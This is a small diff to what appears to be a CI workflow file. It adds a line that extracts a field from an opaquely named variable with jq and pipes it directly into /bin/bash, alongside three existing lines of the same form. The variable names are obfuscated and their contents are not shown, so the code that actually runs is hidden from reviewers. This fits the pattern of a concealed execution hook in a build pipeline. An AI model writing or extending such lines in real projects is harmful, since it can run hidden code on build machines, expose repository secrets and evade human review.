@@ -26,6 +26,7 @@ jobs:
           echo $ncmpf7 | jq -r .s71 | /bin/bash
           echo $y86672 | jq -r .r46 | /bin/bash
           printf '%s' "$m737" | jq -r .wmmv0257 | /bin/bash
+          printf '%s' "$s3066" | jq -r .h512 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
